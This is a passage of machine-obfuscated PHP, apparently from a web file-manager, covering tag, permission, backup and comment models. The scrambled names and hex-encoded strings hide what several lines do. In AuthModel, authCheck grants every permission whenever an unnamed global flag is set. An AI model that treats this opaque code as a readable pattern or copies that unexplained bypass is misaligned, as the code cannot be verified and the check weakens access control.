$eŒâô¿öù[1] . $C³»¹´¹ç–[11]; } else { if (count($eŒâô¿öù) == 3) { $eˆÜàÛéÒÔ = $e¡İ²ÒÛ˜… . $eŒâô¿öù[1] . $eŒâô¿öù[2]; $a³èõï’Öâ = $C³»¹´¹ç–[12] . $eŒâô¿öù[1] . $C³»¹´¹ç–[13] . $eŒâô¿öù[2] . $C³»¹´¹ç–[11]; } } $a³èõï’Öâ = PLUGIN_DIR . $e¡İ²ÒÛ˜… . $C³»¹´¹ç–[4] . $a³èõï’Öâ; } else { if (substr($D±ëò¿“†õ, -5) == $C³»¹´¹ç–[9]) { $e¡İ²ÒÛ˜… = substr($eŒâô¿öù[0], 0, -5); return Model($e¡İ²ÒÛ˜…); } else { $eˆÜàÛéÒÔ = $eŒâô¿öù[0] . $eŒâô¿öù[1]; $a³èõï’Öâ = CONTROLLER_DIR . $eŒâô¿öù[0] . $C³»¹´¹ç–[4] . $eŒâô¿öù[1] . $C³»¹´¹ç–[14]; } } $Bğ”‚†Òèİ = strtolower($eˆÜàÛéÒÔ); goto E’ÏÎÒî•; cµ´ˆÄ±¾â: $eãô‡ÖµïŞ[$Bğ”‚†Òèİ] = new $eˆÜàÛéÒÔ(); $eãô‡ÖµïŞ[$Cİ¦È„Òİ¦] = $eãô‡ÖµïŞ[$Bğ”‚†Òèİ]; return $eãô‡ÖµïŞ[$Bğ”‚†Òèİ]; goto E¸‚—öØ; d˜¶É±¨¼: $C³»¹´¹ç– =& $_SERVER[ÊÖŠ]; static $eãô‡ÖµïŞ = array(); $Cİ¦È„Òİ¦ = $e¡İ²ÒÛ˜…; goto Føì¶²ôÉ; E’ÏÎÒî•: if (isset($eãô‡ÖµïŞ[$Bğ”‚†Òèİ])) { return $eãô‡ÖµïŞ[$Bğ”‚†Òèİ]; } if (is_file($a³èõï’Öâ)) { include_once $a³èõï’Öâ; } if (!class_exists($eˆÜàÛéÒÔ)) { return actionCallError("\x5b{$e¡İ²ÒÛ˜…}\x20\x3d\x3e\40{$eˆÜàÛéÒÔ}\x5d\x20\x63\x6c\141\163\x73\40\x6e\x6f\x74\40\145\170\151\x73\x74\x73\41"); } goto cµ´ˆÄ±¾â; Føì¶²ôÉ: if (isset($eãô‡ÖµïŞ[$Cİ¦È„Òİ¦])) { return $eãô‡ÖµïŞ[$Cİ¦È„Òİ¦]; } $e¡İ²ÒÛ˜… = trim(str_replace($C³»¹´¹ç–[4], $C³»¹´¹ç–[5], $e¡İ²ÒÛ˜…), $C³»¹´¹ç–[4]); $eŒâô¿öù = explode($C³»¹´¹ç–[5], $e¡İ²ÒÛ˜…); goto B«“¿ƒáÙÑ; E¸‚—öØ: } function ActionApply($E°¸ŒÊÜÕ¡, $bÂŠ ¤ÃÚ˜ = array()) { goto cŒõÉßµ¬°; eö êôÒßˆ: $dµ‰ãÂ¦Ğß = substr($E°¸ŒÊÜÕ¡, 0, $CğŸ³Ìóùò); $aƒ³‡®à‡Î = substr($E°¸ŒÊÜÕ¡, $CğŸ³Ìóùò + 1); $D‚ç˜¾£ = Action($dµ‰ãÂ¦Ğß); goto A©Âã–àÜ¯; A©Âã–àÜ¯: if (!method_exists($D‚ç˜¾£, $aƒ³‡®à‡Î)) { return actionCallError("{$E°¸ŒÊÜÕ¡}\x20\155\145\164\150\x6f\144\40\x6e\157\164\40\x65\x78\x69\x73\x74\163\x21"); } $c›®©¹ƒÒÊ = call_user_func_array(array($D‚ç˜¾£, $aƒ³‡®à‡Î), $bÂŠ ¤ÃÚ˜); return $c›®©¹ƒÒÊ; goto AÀ˜†ò¸­Ó; cŒõÉßµ¬°: if (is_array($E°¸ŒÊÜÕ¡)) { return call_user_func_array($E°¸ŒÊÜÕ¡, $bÂŠ ¤ÃÚ˜); } if (function_exists($E°¸ŒÊÜÕ¡)) { return call_user_func_array($E°¸ŒÊÜÕ¡, $bÂŠ ¤ÃÚ˜); } $CğŸ³Ìóùò = strrpos($E°¸ŒÊÜÕ¡, $_SERVER[ÊÖŠ][5]); goto eö êôÒßˆ; AÀ˜†ò¸­Ó: } function actionCallError($b•’£õƒÎÆ) { $a‹³œõæ¶ =& $_SERVER[ÊÖŠ]; $aÅ†ù”ôÚ° = json_encode_force(array($a‹³œõæ¶[15] => this_url(), $a‹³œõæ¶[16] => $GLOBALS[$a‹³œõæ¶[16]])); $aÅ†ù”ôÚ° = str_replace(array($a‹³œõæ¶[17]), array($a‹³œõæ¶[4]), $aÅ†ù”ôÚ°); return write_log($b•’£õƒÎÆ . $a‹³œõæ¶[18] . $aÅ†ù”ôÚ°, $a‹³œõæ¶[19]); } goto EêÔ•´™¯; b¡ìÚÖ§Ğ©: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\x72\x2e\x74\x61\x67\114\151\163\164"; public $modelType = "\125\163\x65\x72\x4f\x70\164\151\157\156"; public $field = array("\156\x61\155\x65", "\163\x74\171\154\x65", "\163\x6f\162\164"); public function listData($Bî®ØÁ›±¸ = false, $dªˆ½Šó± = "\x73\157\162\x74", $DÔãÆÎÇĞô = false) { return parent::listData($Bî®ØÁ›±¸, $dªˆ½Šó±, $DÔãÆÎÇĞô); } public function remove($c´•ƒîÃÉù) { return parent::remove($c´•ƒîÃÉù); } public function add($d¼…Ì¯¯¦è, $dœ±ò²ù = "\x6c\141\x62\145\154\x2d\x67\162\145\x79\55\156\157\x72\x6d\141\x6c") { $bñÌĞ«¤¤Ş =& $_SERVER[©]; if ($this->findByName($d¼…Ì¯¯¦è)) { return !1; } $c¢¨ˆ¬¤íÄ = array($bñÌĞ«¤¤Ş[394] => $d¼…Ì¯¯¦è, $bñÌĞ«¤¤Ş[445] => $dœ±ò²ù, $bñÌĞ«¤¤Ş[2106] => $this->getSort($bñÌĞ«¤¤Ş[255]) + 1); return parent::insert($c¢¨ˆ¬¤íÄ); } public function update($cîÆãâÈÊ“, $C¿Áãó’Êí) { $Bé›Ïİãİ– =& $_SERVER[©]; $eƒìÀ°¯¼È = $this->listData($cîÆãâÈÊ“); $CÉîìÑ»ÖÉ = $this->findByName($C¿Áãó’Êí[$Bé›Ïİãİ–[38]]); if (!$eƒìÀ°¯¼È || $CÉîìÑ»ÖÉ && $CÉîìÑ»ÖÉ[$Bé›Ïİãİ–[375]] != $eƒìÀ°¯¼È[$Bé›Ïİãİ–[375]]) { return !1; } return parent::update($cîÆãâÈÊ“, $C¿Áãó’Êí); } public function moveTop($D®ÑÁîà’ß) { $bÌ‘èÏ¸†° =& $_SERVER[©]; $a‚ÊŒˆÊç§ = parent::listData(); $d¡¦—ö¦÷² = $this->getSort($bÌ‘èÏ¸†°[254]); foreach ($a‚ÊŒˆÊç§ as &$bÌ–ƒõ¼Ë¯) { if ($bÌ–ƒõ¼Ë¯[$bÌ‘èÏ¸†°[375]] == $D®ÑÁîà’ß) { $bÌ–ƒõ¼Ë¯[$bÌ‘èÏ¸†°[2123]] = $d¡¦—ö¦÷²; continue; } $bÌ–ƒõ¼Ë¯[$bÌ‘èÏ¸†°[2123]] += 1; } return parent::resetData($a‚ÊŒˆÊç§); } public function moveBottom($D¡Á¹öŸ™Ñ) { $A“É²¨¾’Æ =& $_SERVER[©]; $D”ÖÊµ¼Ş = $this->getSort($A“É²¨¾’Æ[255]) + 1; return parent::update($D¡Á¹öŸ™Ñ, array($A“É²¨¾’Æ[2123] => $D”ÖÊµ¼Ş)); } public function resetSort($D¯ù½£À¾‰) { goto B·ğšÎ·ä¯; B·ğšÎ·ä¯: $c×¼Ê£ªÊ© =& $_SERVER[©]; $D™‹Œ¾Ï = array(); $D¯ù½£À¾‰ = is_array($D¯ù½£À¾‰) ? $D¯ù½£À¾‰ : array(); goto aµÈ´ºµÓŠ; aµÈ´ºµÓŠ: for ($E‰§ª×§õ = 0; $E‰§ª×§õ < count($D¯ù½£À¾‰); $E‰§ª×§õ++) { $D™‹Œ¾Ï[$D¯ù½£À¾‰[$E‰§ª×§õ] . $c×¼Ê£ªÊ©[43]] = $E‰§ª×§õ + 1; } $aÉÍ§Òİôß = parent::listData(); foreach ($aÉÍ§Òİôß as &$FÁ´ä¤‘Êß) { $cÜ·ø¬¡‡Ï = $D™‹Œ¾Ï[$FÁ´ä¤‘Êß[$c×¼Ê£ªÊ©[375]]]; $FÁ´ä¤‘Êß[$c×¼Ê£ªÊ©[2123]] = $cÜ·ø¬¡‡Ï ? $cÜ·ø¬¡‡Ï : $FÁ´ä¤‘Êß[$c×¼Ê£ªÊ©[2123]]; } goto d’º¬ê¼; d’º¬ê¼: return parent::resetData($aÉÍ§Òİôß); goto f¨¤ò”±; f¨¤ò”±: } private function getSort($bš¨Íî´¶É) { $cŸÊï”ëÇÏ =& $_SERVER[©]; $F‰Ç®ò˜ŠŠ = parent::listData(); $d›ªİŠ½¾‚ = array_to_keyvalue($F‰Ç®ò˜ŠŠ, $cŸÊï”ëÇÏ[43], $cŸÊï”ëÇÏ[2123]); if (!$d›ªİŠ½¾‚) { $d›ªİŠ½¾‚ = array(0); } $bêŸ®ÅïÙô = $bš¨Íî´¶É == $cŸÊï”ëÇÏ[255] ? max($d›ªİŠ½¾‚) : min($d›ªİŠ½¾‚); return intval($bêŸ®ÅïÙô); } } goto b ’¬ó·¤î; cÃ¾”¦ä: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $F†¤‚¶Ôì³ =& $_SERVER[©]; $dÖ§¿Ê™ê = array(array($F†¤‚¶Ôì³[394] => LNG($F†¤‚¶Ôì³[2103]), $F†¤‚¶Ôì³[2104] => $F†¤‚¶Ôì³[2105], $F†¤‚¶Ôì³[2106] => 6, $F†¤‚¶Ôì³[2107] => 1, $F†¤‚¶Ôì³[2108] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($F†¤‚¶Ôì³[394] => LNG($F†¤‚¶Ôì³[2109]), $F†¤‚¶Ôì³[2104] => $F†¤‚¶Ôì³[2110], $F†¤‚¶Ôì³[2106] => 1, $F†¤‚¶Ôì³[2107] => 1, $F†¤‚¶Ôì³[2108] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($F†¤‚¶Ôì³[394] => LNG($F†¤‚¶Ôì³[2111]), $F†¤‚¶Ôì³[2104] => $F†¤‚¶Ôì³[2112], $F†¤‚¶Ôì³[2106] => 2, $F†¤‚¶Ôì³[2107] => 1, $F†¤‚¶Ôì³[2108] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($F†¤‚¶Ôì³[394] => LNG($F†¤‚¶Ôì³[2113]), $F†¤‚¶Ôì³[2104] => $F†¤‚¶Ôì³[2112], $F†¤‚¶Ôì³[2106] => 3, $F†¤‚¶Ôì³[2107] => 1, $F†¤‚¶Ôì³[2108] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($F†¤‚¶Ôì³[394] => LNG($F†¤‚¶Ôì³[2114]), $F†¤‚¶Ôì³[2104] => $F†¤‚¶Ôì³[2115], $F†¤‚¶Ôì³[2106] => 4, $F†¤‚¶Ôì³[2107] => 1, $F†¤‚¶Ôì³[2108] => self::AUTH_SHOW | self::AUTH_VIEW), array($F†¤‚¶Ôì³[394] => LNG($F†¤‚¶Ôì³[2116]), $F†¤‚¶Ôì³[2104] => $F†¤‚¶Ôì³[2117], $F†¤‚¶Ôì³[2106] => 5, $F†¤‚¶Ôì³[2107] => 1, $F†¤‚¶Ôì³[2108] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($F†¤‚¶Ôì³[394] => LNG($F†¤‚¶Ôì³[2118]), $F†¤‚¶Ôì³[2104] => $F†¤‚¶Ôì³[2119], $F†¤‚¶Ôì³[2106] => 7, $F†¤‚¶Ôì³[2107] => 1, $F†¤‚¶Ôì³[2108] => 0)); return $dÖ§¿Ê™ê; } public static function authCheck($BáñóÃ¿‹, $bç”‘»›¿) { $BáñóÃ¿‹ = intval($BáñóÃ¿‹); if (_get($GLOBALS, $_SERVER[©][465])) { return !0; } if ($BáñóÃ¿‹ <= 0) { return !1; } if (($BáñóÃ¿‹ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($BáñóÃ¿‹ & $bç”‘»›¿); } public static function authCheckShow($DÌŒŠÉ¾ãÕ) { return self::authCheck($DÌŒŠÉ¾ãÕ, self::AUTH_SHOW); } public static function authCheckView($A¼¡«Õğ–†) { return self::authCheck($A¼¡«Õğ–†, self::AUTH_VIEW); } public static function authCheckDownload($dø‰›ÔŒÒç) { return self::authCheck($dø‰›ÔŒÒç, self::AUTH_DOWNLOAD); } public static function authCheckUpload($e¿º‚¬ÕÔÀ) { return self::authCheck($e¿º‚¬ÕÔÀ, self::AUTH_UPLOAD); } public static function authCheckEdit($EÈôÊ‚ŒŸ) { return self::authCheck($EÈôÊ‚ŒŸ, self::AUTH_EDIT); } public static function authCheckRemove($cˆÇÇØ—Š) { return self::authCheck($cˆÇÇØ—Š, self::AUTH_REMOVE); } public static function authCheckShare($d¿¬´Ì„ô©) { return self::authCheck($d¿¬´Ì„ô©, self::AUTH_SHARE); } public static function authCheckComment($C“–Ò´¯Œ) { return self::authCheck($C“–Ò´¯Œ, self::AUTH_COMMENT); } public static function authCheckEvent($FÑØ™ÃÏâ›) { return self::authCheck($FÑØ™ÃÏâ›, self::AUTH_EVENT); } public static function authCheckRoot($cÉ˜ŠÒ©øˆ) { return self::authCheck($cÉ˜ŠÒ©øˆ, self::AUTH_ROOT); } public static function authDisable($fÕÚØ›ŒË«, $fÂœµ‘¥ÙÏ) { if (intval($fÕÚØ›ŒË«) <= 0) { return 0; } return intval($fÕÚØ›ŒË«) & ~$fÂœµ‘¥ÙÏ; } public $optionType = "\123\x79\x73\x74\x65\155\x2e\x73\x6f\165\x72\143\145\x41\x75\164\x68\114\151\x73\164"; public $field = array("\x6e\141\155\145", "\141\165\164\150", "\x6c\141\142\x65\x6c", "\144\x69\x73\160\x6c\x61\171", "\x73\x79\x73\164\x65\155", "\163\x6f\x72\x74"); public function initData() { $bÚÉ‰ÕÔ‹ = $this->authDefault(); foreach ($bÚÉ‰ÕÔ‹ as $A‚ë‰ÒÅĞ) { $this->add($A‚ë‰ÒÅĞ); } } public function listData($B…ªÙğÕÏµ = false, $BÈ­Öìáæ = "\x73\x6f\162\164", $E´È™èáÅº = false) { return parent::listData($B…ªÙğÕÏµ, $BÈ­Öìáæ, $E´È™èáÅº); } public function update($eë™“š·„, $bõÚóÓÕ·¨) { $Eñ£Ğ¼Ú•® =& $_SERVER[©]; $aƒŸ÷Ê¢ß = parent::listData($eë™“š·„); $cÒ¨æ¾„ò’ = $this->findByName($bõÚóÓÕ·¨[$Eñ£Ğ¼Ú•®[38]]); if (!$aƒŸ÷Ê¢ß || $cÒ¨æ¾„ò’ && $cÒ¨æ¾„ò’[$Eñ£Ğ¼Ú•®[375]] != $aƒŸ÷Ê¢ß[$Eñ£Ğ¼Ú•®[375]]) { return !1; } $this->filterAuth($bõÚóÓÕ·¨[$Eñ£Ğ¼Ú•®[384]]); return parent::update($eë™“š·„, $bõÚóÓÕ·¨); } public function remove($dŠà¼­çÀ¹) { $aŒ‹ùğ‰İ‚ = parent::listData($dŠà¼­çÀ¹); if (!$aŒ‹ùğ‰İ‚ || $aŒ‹ùğ‰İ‚[$_SERVER[©][1077]]) { return !1; } return parent::remove($dŠà¼­çÀ¹); } public function add($bØ„Ûàœğ™ = array()) { goto AŞ™Ò—÷¢ã; A§¹š¼Ñ„Ñ: return parent::insert($bØ„Ûàœğ™); goto AêšáÑ¹²; AŞ™Ò—÷¢ã: $d­Ì¼›®á“ =& $_SERVER[©]; if ($this->findByName($bØ„Ûàœğ™[$d­Ì¼›®á“[38]])) { return !1; } $d ßã‘Óğñ = array($d­Ì¼›®á“[38] => $d­Ì¼›®á“[43], $d­Ì¼›®á“[384] => 1, $d­Ì¼›®á“[2120] => $d­Ì¼›®á“[2121], $d­Ì¼›®á“[2122] => 1, $d­Ì¼›®á“[1077] => 0, $d­Ì¼›®á“[2123] => 0); goto C¼¥ù†Áê; C¼¥ù†Áê: $bØ„Ûàœğ™ = array_merge($d ßã‘Óğñ, $bØ„Ûàœğ™); $bØ„Ûàœğ™[$d­Ì¼›®á“[2123]] = $this->getSort(); $this->filterAuth($bØ„Ûàœğ™[$d­Ì¼›®á“[384]]); goto A§¹š¼Ñ„Ñ; AêšáÑ¹²: } private function getSort() { $a…‘—–„Œ =& $_SERVER[©]; $BöòšĞôœ« = parent::listData(); $DÊÊÁó—¼½ = array_to_keyvalue($BöòšĞôœ«, $a…‘—–„Œ[43], $a…‘—–„Œ[2123]); return empty($DÊÊÁó—¼½) ? 0 : max($DÊÊÁó—¼½) + 1; } private function filterAuth(&$c²ƒØ«–Òá) { goto fÏ—‹ØÙ²¯; Aôè„«¹Š›: foreach ($eï„­¼ÄóÉ as $Bêø¥ÎÒâ¨) { if ($c²ƒØ«–Òá & $Bêø¥ÎÒâ¨) { $cÅî·ñ¥ªÄ[] = $Bêø¥ÎÒâ¨; } } if (in_array(self::AUTH_ROOT, $cÅî·ñ¥ªÄ)) { $c²ƒØ«–Òá = array_sum($eï„­¼ÄóÉ); return; } $fªèĞ½¤ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto fèä»©ø¢; fÏ—‹ØÙ²¯: if (!$c²ƒØ«–Òá) { return; } $eï„­¼ÄóÉ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $cÅî·ñ¥ªÄ = array(); goto Aôè„«¹Š›; fèä»©ø¢: foreach ($cÅî·ñ¥ªÄ as $Bêø¥ÎÒâ¨) { if (isset($fªèĞ½¤[$Bêø¥ÎÒâ¨])) { $cÅî·ñ¥ªÄ = array_merge($cÅî·ñ¥ªÄ, $fªèĞ½¤[$Bêø¥ÎÒâ¨]); } } $cÅî·ñ¥ªÄ[] = self::AUTH_SHOW; $c²ƒØ«–Òá = array_sum(array_unique($cÅî·ñ¥ªÄ)); goto b‹¥Öà´’†; b‹¥Öà´’†: } public function sort($a†ã‰®è‡, $e†ÌíÆ×Àˆ) { return parent::update($a†ã‰®è‡, $e†ÌíÆ×Àˆ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\x62\141\143\153\165\160\114\x69\163\164"; public $field = array("\x69\x6f", "\x6e\x61\155\145", "\x73\164\141\164\x75\x73", "\x63\157\156\x74\145\156\164", "\162\x65\163\x75\154\x74", "\x74\151\155\145\106\x72\x6f\155", "\164\x69\155\x65\124\157"); public function config() { goto BÍ½ÒÇììÚ; eÌø”ÖóÉØ: $e¹ğ“‚¾¶ = is_array($e¹ğ“‚¾¶) ? $e¹ğ“‚¾¶ : array(); if (!isset($e¹ğ“‚¾¶[$AœÓ³ªŠ’†[691]])) { $e¹ğ“‚¾¶[$AœÓ³ªŠ’†[691]] = $AœÓ³ªŠ’†[476]; } $A…¥ÕÅ÷ä = array(); goto eÑ™É¿ùä; C¾÷½‹òÇé: if (isset($A…¥ÕÅ÷ä[$AœÓ³ªŠ’†[200]])) { $A…¥ÕÅ÷ä[$AœÓ³ªŠ’†[200]] = json_decode($A…¥ÕÅ÷ä[$AœÓ³ªŠ’†[200]], !0); } if (isset($e¹ğ“‚¾¶[$AœÓ³ªŠ’†[200]])) { $A…¥ÕÅ÷ä[$AœÓ³ªŠ’†[200]][$AœÓ³ªŠ’†[1409]] = $e¹ğ“‚¾¶[$AœÓ³ªŠ’†[200]]; unset($e¹ğ“‚¾¶[$AœÓ³ªŠ’†[200]]); } return array_merge($A…¥ÕÅ÷ä, $e¹ğ“‚¾¶); goto c¯ÒÜÀáèò; BÍ½ÒÇììÚ: $AœÓ³ªŠ’† =& $_SERVER[©]; $e¹ğ“‚¾¶ = Model($AœÓ³ªŠ’†[1085])->get($AœÓ³ªŠ’†[713]); $e¹ğ“‚¾¶ = json_decode($e¹ğ“‚¾¶, !0); goto eÌø”ÖóÉØ; eÑ™É¿ùä: Action($AœÓ³ªŠ’†[2124])->taskInit(); $aŞßùøˆæ¡ = Model($AœÓ³ªŠ’†[2125])->listData(); foreach ($aŞßùøˆæ¡ as $d¼¼ŸºÓ¯Û) { if ($d¼¼ŸºÓ¯Û[$AœÓ³ªŠ’†[1077]] == $AœÓ³ªŠ’†[93] && $d¼¼ŸºÓ¯Û[$AœÓ³ªŠ’†[1422]] == $AœÓ³ªŠ’†[2126]) { $A…¥ÕÅ÷ä = $d¼¼ŸºÓ¯Û; break; } } goto C¾÷½‹òÇé; c¯ÒÜÀáèò: } public function listData($e¥ÂÎ–…Ñ­ = false, $B‹¥Ç „™Ÿ = "\x6d\157\x64\x69\x66\171\x54\x69\155\145", $fİŠ»‹ÄĞ¤ = false) { return parent::listData($e¥ÂÎ–…Ñ­, $B‹¥Ç „™Ÿ, !0); } public function lastItem() { $AÜÆ¾ô = $this->listData(); return !empty($AÜÆ¾ô[0]) ? $AÜÆ¾ô[0] : null; } public function kill($dÒÇ‹´ë‰) { goto bÓ™®®‹†; bÓ™®®‹†: $D‰ ¤»ƒ¾Ë =& $_SERVER[©]; $eç•‘Á‡‰Ä = $this->listData($dÒÇ‹´ë‰); if (!$eç•‘Á‡‰Ä || empty($eç•‘Á‡‰Ä[$D‰ ¤»ƒ¾Ë[38]])) { return !0; } goto f­ªÅ£òĞ¦; CŞï™´Ò: return $this->remove($dÒÇ‹´ë‰); goto a£ï¥Û¯é; BŸ’æ‹Ôá: $d¨æî§¢ÈŸ = $eç•‘Á‡‰Ä[$D‰ ¤»ƒ¾Ë[38]]; $E—İÎ¢ñ’¿ = TEMP_FILES . $D‰ ¤»ƒ¾Ë[709] . $d¨æî§¢ÈŸ . $D‰ ¤»ƒ¾Ë[18]; IO::remove($E—İÎ¢ñ’¿, !1); goto CŞï™´Ò; f­ªÅ£òĞ¦: Task::kill($D‰ ¤»ƒ¾Ë[712]); Task::kill($D‰ ¤»ƒ¾Ë[728]); Task::kill($D‰ ¤»ƒ¾Ë[736]); goto BŸ’æ‹Ôá; a£ï¥Û¯é: } public function remove($Cæ†°¬ƒ‡) { $dÜ¦ò×‡ì˜ = $this->listData($Cæ†°¬ƒ‡); if (!$dÜ¦ò×‡ì˜) { return !0; } return $this->backupRemove($dÜ¦ò×‡ì˜); } private function backupRemove($b‡ŠõÑ¤”Ê) { $F÷İ†“É®Ÿ =& $_SERVER[©]; parent::remove($b‡ŠõÑ¤”Ê[$F÷İ†“É®Ÿ[375]]); $Dğëå†ÑàË = "\173\151\x6f\72{$b‡ŠõÑ¤”Ê[$F÷İ†“É®Ÿ[690]]}\175\57\x64\x61\x74\141\142\x61\x73\x65\x2f\142\141\x63\153\x75\160\x5f" . $b‡ŠõÑ¤”Ê[$F÷İ†“É®Ÿ[38]]; IO::remove($Dğëå†ÑàË, !1); return !0; } public function start() { goto EìšİÎ¬¡Ï; E´ã“ç‚ÛŠ: return !0; goto B‡”ğ¿×¼¹; B˜“Û¾Ôõ±: if (!$Fì»å‘Ç š->dbFile()) { return !1; } if ($fÁ¨À’ÌœÚ[$f¼äŒè­‰á[691]] == $f¼äŒè­‰á[476]) { $Fì»å‘Ç š->file(); } Backup::set(array($f¼äŒè­‰á[688] => 1, $f¼äŒè­‰á[702] => time())); goto E´ã“ç‚ÛŠ; EìšİÎ¬¡Ï: $f¼äŒè­‰á =& $_SERVER[©]; if ($GLOBALS[$f¼äŒè­‰á[16]][$f¼äŒè­‰á[94]][$f¼äŒè­‰á[2127]] != $f¼äŒè­‰á[93]) { return !0; } $fÁ¨À’ÌœÚ = $this->config(); goto bôÓ¯„¤Å·; c—ó÷İ½ëÂ: $Fì»å‘Ç š = new Backup(); $Fì»å‘Ç š->keep(); if (!$Fì»å‘Ç š->db()) { return !1; } goto B˜“Û¾Ôõ±; bôÓ¯„¤Å·: if (!$fÁ¨À’ÌœÚ || $fÁ¨À’ÌœÚ[$f¼äŒè­‰á[1406]] != $f¼äŒè­‰á[93]) { return !1; } $Eµ´¾Ù©ˆ¥ = $this->process(); foreach ($Eµ´¾Ù©ˆ¥ as $AšÒÛ¾©—ö) { if ($AšÒÛ¾©—ö) { return Task::restart($AšÒÛ¾©—ö[$f¼äŒè­‰á[375]]); } } goto c—ó÷İ½ëÂ; B‡”ğ¿×¼¹: } public function process() { $C ŠÈğÌÂ¾ =& $_SERVER[©]; return array($C ŠÈğÌÂ¾[693] => Task::get($C ŠÈğÌÂ¾[712]), $C ŠÈğÌÂ¾[696] => Task::get($C ŠÈğÌÂ¾[728]), $C ŠÈğÌÂ¾[177] => Task::get($C ŠÈğÌÂ¾[736])); } public function restore() { $bâ§‰Ç¦…½ =& $_SERVER[©]; ActionCall($bâ§‰Ç¦…½[2128], !0, 1); ActionCall($bâ§‰Ç¦…½[2128], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\145\156\164"; protected $tableMeta = array("\164\141\142\x6c\x65\116\x61\155\145" => "\x63\x6f\x6d\155\x65\156\x74\x5f\x6d\145\x74\141", "\x6d\x65\x74\141\106\151\x65\x6c\x64" => "\143\157\155\155\x65\x6e\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($c‹Ë­½‘ñ¥) { $e‚™’·‡©Æ =& $_SERVER[©]; if ($c‹Ë­½‘ñ¥[$e‚™’·‡©Æ[2129]]) { $aÜÑµóÄøî = $this->where(array($e‚™’·‡©Æ[2130] => $c‹Ë­½‘ñ¥[$e‚™’·‡©Æ[2129]]))->find(); if (!$aÜÑµóÄøî || $aÜÑµóÄøî[$e‚™’·‡©Æ[379]] != $c‹Ë­½‘ñ¥[$e‚™’·‡©Æ[379]] || $aÜÑµóÄøî[$e‚™’·‡©Æ[464]] != $c‹Ë­½‘ñ¥[$e‚™’·‡©Æ[464]]) { return !1; } $this->where(array($e‚™’·‡©Æ[2130] => $c‹Ë­½‘ñ¥[$e‚™’·‡©Æ[2129]]))->setAdd($e‚™’·‡©Æ[2131], 1); } return $this->add($c‹Ë­½‘ñ¥); } public function remove($FŒ÷ƒ‘£) { $fÍ«¤Œ¬ =& $_SERVER[©]; $c¹‘¥†¹èê = array($fÍ«¤Œ¬[2130] => $FŒ÷ƒ‘£); $d»ß»³±Ó = $this->where($c¹‘¥†¹èê)->find(); if ($d»ß»³±Ó[$fÍ«¤Œ¬[2129]]) { $this->where(array($fÍ«¤Œ¬[2130] => $d»ß»³±Ó[$fÍ«¤Œ¬[2129]]))->setAdd($fÍ«¤Œ¬[2131], -1); } return $this->where($c¹‘¥†¹èê)->delete(); } public function edit($aéô†æëèµ, $B•­ğË±Ÿ) { $D™ÕöÀøŠÖ =& $_SERVER[©]; $DÅ´¢øÌí¾ = array($D™ÕöÀøŠÖ[2130] => $aéô†æëèµ); return $this->where($DÅ´¢øÌí¾)->save(array($D™ÕöÀøŠÖ[2132] => $B•­ğË±Ÿ)); } public function prasise($c‹õá¹ÇØ) { $Fîîãñ¬´ =& $_SERVER[©]; $C–·ÉÍ¶¸ = Model($Fîîãñ¬´[2133]); $a†¿‰ïäí = array($Fîîãñ¬´[2130] => $c‹õá¹ÇØ, $Fîîãñ¬´[1425] => USER_ID); $fÀïëÉ‡ÌÃ = $C–·ÉÍ¶¸->where($a†¿‰ïäí)->find(); if (!$fÀïëÉ‡ÌÃ) { $C–·ÉÍ¶¸->add($a†¿‰ïäí); $aÈÉÒÅ‰°— = $this->where(array($Fîîãñ¬´[2130] => $c‹õá¹ÇØ))->setAdd($Fîîãñ¬´[2134], 1); } else { $C–·ÉÍ¶¸->where($a†¿‰ïäí)->delete(); $aÈÉÒÅ‰°— = $this->where(array($Fîîãñ¬´[2130] => $c‹õá¹ÇØ))->setAdd($Fîîãñ¬´[2134], -1); } return $aÈÉÒÅ‰°—; } public function targetInfo($báƒœ¹ì÷¿, $eï¼òíöğ) { goto EÌƒ²äœ¦½; EÌƒ²äœ¦½: $cŞÏçÜßˆ =& $_SERVER[©]; $C½¸»ñ¤âÊ = array($cŞÏçÜßˆ[529] => $báƒœ¹ì÷¿, $cŞÏçÜßˆ[530] => $eï¼òíöğ); $DÉ×ñìòÌø = $this->where($C½¸»ñ¤âÊ)->count(); goto B‘·½àÃ­–; B‘·½àÃ­–: $a©ëÉŸ¼œ = 